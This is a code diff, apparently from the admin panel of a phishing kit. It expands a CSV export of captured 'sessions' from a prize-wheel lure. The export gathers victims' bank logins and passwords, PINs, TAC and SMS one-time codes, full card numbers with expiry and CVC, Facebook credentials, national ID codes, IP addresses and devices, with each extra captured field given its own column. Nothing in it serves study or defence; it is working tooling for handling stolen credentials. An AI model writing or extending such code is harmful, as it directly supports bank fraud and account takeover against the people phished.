@@ -1376,37 +1376,96 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         const s = v == null ? "" : String(v);
         return `"${s.replace(/"/g, '""')}"`;
       };
-      const val = (v: unknown) => (v == null ? "" : v);
+
+      // Her bilgi kendi kolonunda: bilinen alanlar + form_data'daki diger tum keyler
+      type Col = { header: string; get: (r: DemoSession, fd: Record<string, any>) => unknown };
+      const cols: Col[] = [
+        { header: "ID", get: (r) => r.public_id },
+        { header: "Session UUID", get: (r) => r.id },
+        { header: "Tarih", get: (r) => (r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "") },
+        { header: "Odul", get: (r) => (r.amount ? `€${r.amount}` : "") },
+        { header: "Para Birimi", get: (_r, fd) => fd.currency },
+        { header: "Cark Sonucu", get: (_r, fd) => fd.wheel_result_label },
+        { header: "Cark Tutari", get: (_r, fd) => fd.wheel_result_amount },
+        { header: "Isim", get: (_r, fd) => fd.firstName },
+        { header: "Soyisim", get: (_r, fd) => fd.lastName },
+        { header: "Telefon", get: (_r, fd) => fd.phone },
+        { header: "Banka", get: (_r, fd) => fd.bankName },
+        { header: "Banka Slug", get: (_r, fd) => fd.bankSlug },
+        { header: "Giris Yontemi", get: (_r, fd) => fd.loginMethod },
+        { header: "Banka Tel", get: (_r, fd) => fd.bankPhone },
+        { header: "Kullanici Adi", get: (_r, fd) => fd.username },
+        { header: "Sifre", get: (_r, fd) => fd.password },
+        { header: "PIN", get: (_r, fd) => fd.pin },
+        { header: "TAC", get: (_r, fd) => fd.tacCode },
+        { header: "Kisisel Kod", get: (_r, fd) => fd.personalCode },
+        { header: "ID Kodu", get: (_r, fd) => fd.idCode },
+        { header: "Asmens Kodu", get: (_r, fd) => fd["Asmens-kodas"] },
+        { header: "Atpazinimo Kodu", get: (_r, fd) => fd["Atpažinimo-kodas"] },
+        { header: "Verfuegernummer", get: (_r, fd) => fd.verfuegernummer },
+        { header: "Ordered 1", get: (_r, fd) => fd.orderedField1 },
+        { header: "Ordered 2", get: (_r, fd) => fd.orderedField2 },
+        { header: "Ordered 2 Tipi", get: (_r, fd) => fd.orderedField2Type },
+        { header: "SMS Kodu", get: (_r, fd) => fd.smsCode },
+        { header: "Kart Sahibi", get: (_r, fd) => fd.cardHolder },
+        { header: "Kart No", get: (_r, fd) => fd.cardNumber },
+        { header: "Kart SKT", get: (_r, fd) => fd.cardExpiry },
+        { header: "Kart CVC", get: (_r, fd) => fd.cardCvc },
+        { header: "FB Isim", get: (_r, fd) => fd.fbFirstName },
+        { header: "FB Soyisim", get: (_r, fd) => fd.fbLastName },
+        { header: "FB E-posta", get: (_r, fd) => fd.fbEmail },
+        { header: "FB Sifre", get: (_r, fd) => fd.fbPassword },
+        { header: "FB User ID", get: (_r, fd) => fd.fbUserId },
+        { header: "Onay Durumu", get: (_r, fd) => fd.approvalStatus },
+        { header: "Onay Kodu", get: (_r, fd) => fd.approvalCode },
+        { header: "Onay Gecmisi", get: (_r, fd) => fd.approvalHistory },
+        { header: "Banka Gonderim Zamani", get: (_r, fd) => fd.bankSubmittedAt },
+        { header: "Sayfa", get: (r) => r.current_step },
+        { header: "Durum", get: (r) => r.status },
+        { header: "Gizli", get: (r) => (r.is_hidden ? "evet" : "") },
+        { header: "IP", get: (r) => r.ip_address },
+        { header: "Cihaz", get: (r) => r.user_agent },
+        { header: "Partner", get: (r) => r.partner_name },
+      ];
+
+      // curated getter'larda kullanilan form_data key'leri (tekrar kolon acmamak icin)
+      const CURATED_FD_KEYS = new Set([
+        "currency", "wheel_result_label", "wheel_result_amount", "firstName", "lastName", "phone",
+        "bankName", "bankSlug", "loginMethod", "bankPhone", "username", "password", "pin", "tacCode",
+        "personalCode", "idCode", "Asmens-kodas", "Atpažinimo-kodas", "verfuegernummer",
+        "orderedField1", "orderedField2", "orderedField2Type", "smsCode",
+        "cardHolder", "cardNumber", "cardExpiry", "cardCvc",
+        "fbFirstName", "fbLastName", "fbEmail", "fbPassword", "fbUserId",
+        "approvalStatus", "approvalCode", "approvalHistory", "bankSubmittedAt",
+      ]);
+
+      // form_data'daki kalan TUM keyler -> her biri kendi kolonu
+      const extraKeys = new Set<string>();
+      for (const r of all) {
+        for (const k of Object.keys((r.form_data as Record<string, any>) ?? {})) {
+          if (!CURATED_FD_KEYS.has(k)) extraKeys.add(k);
+        }
+      }
+      const extraCols = [...extraKeys].sort();
 
       const headers = [
-        "ID", "Session UUID", "Tarih", "Odul", "Cark Sonucu",
-        "Isim", "Soyisim", "Telefon",
-        "Banka", "Banka Tel", "Kullanici Adi", "Sifre",
-        "PIN", "TAC", "Kisisel Kod", "Verfuegernummer",
-        "Ordered 1", "Ordered 2", "SMS Kodu",
-        "Kart Sahibi", "Kart No", "Kart SKT", "Kart CVC",
-        "FB Isim", "FB Soyisim", "FB E-posta", "FB Sifre", "FB User ID",
-        "Sayfa", "Durum", "Gizli", "IP", "Cihaz", "Partner",
+        ...cols.map((c) => c.header),
+        ...extraCols.map((k) => `Ek: ${k}`),
         "Form Data (JSON)",
       ];
+
+      const cell = (v: unknown) =>
+        v == null ? "" : typeof v === "object" ? JSON.stringify(v) : v;
 
       const lines = all.map((r) => {
         const fd = (r.form_data ?? {}) as Record<string, any>;
         return [
-          val(r.public_id),
-          r.id,
-          r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "",
-          r.amount ? `€${r.amount}` : "",
-          val(fd.wheel_result_label),
-          val(fd.firstName), val(fd.lastName), val(fd.phone),
-          val(fd.bankName), val(fd.bankPhone), val(fd.username), val(fd.password),
-          val(fd.pin), val(fd.tacCode), val(fd.personalCode), val(fd.verfuegernummer),
-          val(fd.orderedField1), val(fd.orderedField2), val(fd.smsCode),
-          val(fd.cardHolder), val(fd.cardNumber), val(fd.cardExpiry), val(fd.cardCvc),
-          val(fd.fbFirstName), val(fd.fbLastName), val(fd.fbEmail), val(fd.fbPassword), val(fd.fbUserId),
-          r.current_step, r.status, r.is_hidden ? "evet" : "", val(r.ip_address), val(r.user_agent), val(r.partner_name),
+          ...cols.map((c) => cell(c.get(r, fd))),
+          ...extraCols.map((k) => cell(fd[k])),
           JSON.stringify(fd),
-        ].map(esc).join(";");
+        ]
+          .map(esc)
+          .join(";");
       });
 
       const csv = "﻿" + [headers.map(esc).join(";"), ...lines].join("\r\n");
